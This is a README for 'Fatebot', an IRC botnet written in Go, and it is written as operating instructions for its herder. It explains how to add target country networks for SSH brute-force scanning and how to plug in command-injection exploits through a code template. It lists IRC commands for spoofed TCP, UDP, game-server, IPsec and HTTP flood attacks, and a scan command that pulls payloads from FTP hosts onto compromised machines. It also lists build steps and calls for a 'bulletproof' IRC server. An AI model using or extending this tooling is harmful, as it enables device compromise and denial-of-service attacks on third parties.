# Fatebot
An IRC botnet, that's mainly used to launch denial-of-service attacks. This botnet will primarily scan on SSH default port to brute-force attack, and HTTP for IoT or server vulnerabilities exploit. <b>The "main" scanning method that's involves SSH default port brute-force attack, which mostly used by servers. Also the loader process are not that effective for multiple architecture. So, do not expect many bot hits.</b> 

Option about the scan feature in this bot is to scope scan on CN, USA, KR, and BR networks by default. However, you can also do a random scan, or even add your own networks. All of these is up to you.
	
	# How to add more scanner network (Create your own scan mod).
	
	1) Go to the scanner.go file and add a new slice for your scan network.
	
		# Example:
			
			var Italy_Network = []string {
				"123.456", //123.456.0.0/16
			}
			
			# since v0.6.0 will use only 16 bits of the IP range to set up scan networks (I'm still confused about the subnet mask LOL).
			
	2) Go to the header.go file and scroll down to the map name "ScanMap".
	3) Customize your key and value. The value of the map is structure, so you need to call a value in the "Bot" structure and fill it.
	
		# Example:
		
			"-fi": {				 # This key will be the command of a network arg in the "?scan" command.
				scanNetwork: Finland_Network, 	 # Fill the "scanNetwork" that's a value of the "Bot" structure. To your network slice.
				scanOptFull: "\"FINLAND\"",	 # Add the full name of the network for a reporting process.
				isRandom:    false,		 # Set "isRandom" to false because it's not a full random network.
			},
	
	4) Done... Just save it.
	
# Add/Customize Exploit
The vulnerability exploit that's used in this botnet will mostly be command injection exploits. You can add more new exploits if you want, but I recommend using a command injection vulnerability exploit. This is because you won't need to add or write anything more; you just need to configure it. I try to make the exploit feature easy and flexible to the configuration as much as i can. If the two examples down below is not enough, you can also see more examples in <b>"internal/exploit.go".</b>

	#################################################################
	### Example 1: In case that you want to add a new HTTP header ###
	#################################################################
	
	func (b *Bot) CVE_someYear_newCVE1() {
		
		# If you add a post exploit, then customize it with a JSON.
		# In case that your exploit needs to inject on a post body just call an inject function --> b.inject("default or MIPS", true)
		
		
		# This example will use default architecture so that's why we put "default" if your exploit use MIPS just put "mips".
		# Always put true because we are doing an exploit not scanning (The inject function has been reused in the scanner function).
			
		newCVE1, _ := json.Marshal(map[string]string{
			"example":      "something",
			"example":      "something"+b.inject("mips", true),
		})
		
		# This is just a HTTP header customization.
		# Incase your exploit needs to inject on a header just do the same with the body. 
		
		enewCVE1 := Exploit{
			exploitName:       "CVE_someYear_newCVE1",			# Customize the exploit name for a reporting process.
			exploitMethod:     "POST",					# Which HTTP method you will use for this exploit?
			exploitPath:       "example/something",				# Customize URL path.
			exploitBody:       strings.NewReader(string(newCVE1)),	        # Customize HTTP body.
			exploitAgent:      "example"+b.inject("mips", true),		# Customize HTTP agent.
			exploitAccept:     "example",					# Customize HTTP accept.
			exploitContType:   "example",					# Customize HTTP content type.
			exploitConnection: "example",					# Customize HTTP connection.
		}
		
		# If you want to add new header then just call it, like the example down below.
		
		_, newHeader := enewCVE1.setupExploit(b.tempIP)			# Use "enewCVE1" for calling the Exploit structure-function.
		newHeader.Header.Set("newHeader", "headerContent")		# Add a new header (header, header_content).
		b.exploitLauncher(enewCVE1, newHeader)				# Launch the exploit by putting the exploit structure and header in to "b.exploitLauncher(ourExploit, ourHeader)" function.
	}
	
	##################################################################
	### Example 2: In case you don't need to add a new HTTP header ###
	##################################################################
	
	# This example is the same as the first example in terms of header and body configs.
	
	func (b *Bot) CVE_someYear_newCVE2() {			
		newCVE2, _ := json.Marshal(map[string]string{
			"example":      "something",
			"example":      "something"+b.inject("", true),
		})
		enewCVE2 := Exploit{
			exploitName:       "CVE_someYear_newCVE2",			# Customize the exploit name for a reporting process.
			exploitMethod:     "POST",					# Which HTTP method you will use for this exploit?
			exploitPath:       "example/something",				# Customize URL path.
			exploitBody:       strings.NewReader(string(newCVE2)),	        # Customize HTTP body.
			exploitAgent:      "example"+b.inject("", true),		# Customize HTTP agent.
			exploitAccept:     "example",					# Customize HTTP accept.
			exploitContType:   "example",					# Customize HTTP content type.
			exploitConnection: "example",					# Customize HTTP connection.
		}

		b.exploitLauncher(enewCVE2,  b.selfRequest(enewCVE2))		# In the first example, you need to call "setupExploit" function but in this example, you don't need to call it.
										# Just call the "exploitLauncher" function and in the second argument using the "selfRequest" function instead of a newHeader value. 
										# Because we only use the default header set and then put our exploit structure into the "selfRequest" argument.
	}
	
# Attack Feature
The attack feature will mostly focus on the transport layer attack, but it will also include application and network layer attacks. All of the attack vectors, except for the "HTTP" DDoS attack vectors, will use random source ports and windows size automatically. However, the destination port will be configurable by the bot herder themselves.

	# tcp -syn 127.0.0.1 192.168.50.129 -r 100 //a command that's used in this screenshot.

<img src="assets/synflood.png" alt="synflood, DoS example">

# IRC Commands

 	ATTACK VECTORS:
	
        # Mark: The min and max of attack size will be 50 - 1400 bytes. If you put over or lower size it will set to 100 automatically.
        
	# Tip: You can use the "-r" command for random DST ports and src IPs, but it can only use with these 2 args!!!
	# Example: ?tcp -fin -r 192.168.50.129 -r 100

	?udp <src> <dst> <port> <size>                Just a normal UDP flood attack.
	?tcp <flag> <src> <dst> <port> <size>	      TCP flood with customizes flag.

		-syn            TCP flood with syn packet, just a normal SYN flood.
		-ack		TCP flood with ack packet, just a normal ACK flood.
		-psh		TCP flood with psh packet, just a normal PSH flood.
		-urg		TCP flood with urg packet, just a normal URG flood.
		-rst		TCP flood with RST packet, for broke a TCP connection between client and target server.
		-fin		TCP flood with FIN packet, to request close connection when target server is blocking a syn packet.

	?saf <src> <dst> <port> <size>                Flood by using TCP SYN+ACK flags to the target server.
	?xmas <src> <dst> <port> <size>		      Flood TCP packets by using all of the TCP flags to the target server.
	?vse <src> <dst> <port>			      Flood TSource Engine Query request to the target game server that used valve source engine.
	?fms <src> <dst>			      Flood query payload to a FiveM game server.
	?ipsec <src> <dst>			      Flood payload to overwhelm system resources of VPN service and make IPSec VPN connections being affected.
	?poling <url>			      	      Flood HTTP post-login requests to the target login web page, didn't do any of IP spoofing!!!
	?jumbo <url>				      Flood HTTP post request with a big XML payload, didn't do any of IP spoofing!!!
	?get <url>			      	      Flood HTTP get requests to the target website, didn't do any of IP spoofing!!!

	SCAN FUNCTION:
		
	# Example: ?scan -r ftp://1.2.3.4/bin/payload_x32 ftp://5.6.7.8/bin/payload_mips_x32 ftp://4.3.2.1/bin/payload_arm_x32
		
	?scan <network> <default> <mips> <arm>		Scan default SSH and HTTP port on the network, brute-force attack, and exploit the target.

		-cn		Scan on China network.
		-usa		Scan on U.S.A network.
		-kr		Scan on south korea network.
		-br		Scan on brazil network.
		-r		Scan with random IPs.
		
	?update <default> <mips> <arm>          Update the bot source code or adapt it as a service.
	?info				        Get bot system information, for bot analysis, etc.
	?kill				        Bot self-close.
	?stopddos 			        Stop DDoS attacking.
	?stopscan			        Stop scanning.
	
# Build Payload

	chmod +x build.sh
	./build.sh <payload>
	
	# The bot system architecture is up to which payload you upload on your payload server.
	# If you upload x32 on your payload server, the bot that you have scanned will be only x32 arch.
	# The MIPS and ARM architecture is specific for doing an exploit only, so it doesn't count to the scan process!!!
	# To run the payload you need to run with root access!!!

# Requirements
<ul>
	<li>x1 Bulletproof IRC Server</li>
</ul>

<ul>
	<li>x1 Payload Hosting Server</li>
</ul>

<ul>
	<li>IRC Client</li>
</ul>

<ul>
	<li>Go Compiler</li>
</ul>

<ul>
	<li>UPX Packer</li>
</ul>

<ul>
	<li>Code\Text Editor</li>
</ul>
